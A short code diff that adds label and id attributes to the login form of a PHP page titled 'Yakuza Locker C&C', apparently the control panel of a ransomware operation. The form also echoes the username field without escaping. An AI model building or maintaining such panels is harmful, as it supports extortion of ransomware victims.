@@ -71,12 +71,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     <h2>Login to Yakuza Locker C&C</h2>
     <form action="<?= htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
         <div class="hacker-input">
-            <label>Username</label>
-            <input type="text" name="username" value="<?= $username; ?>" required>
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" value="<?= $username; ?>" required>
         </div>
         <div class="hacker-input">
-            <label>Password</label>
-            <input type="password" name="password" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
         </div>
         <div class="hacker-button">
             <input type="submit" value="Login">
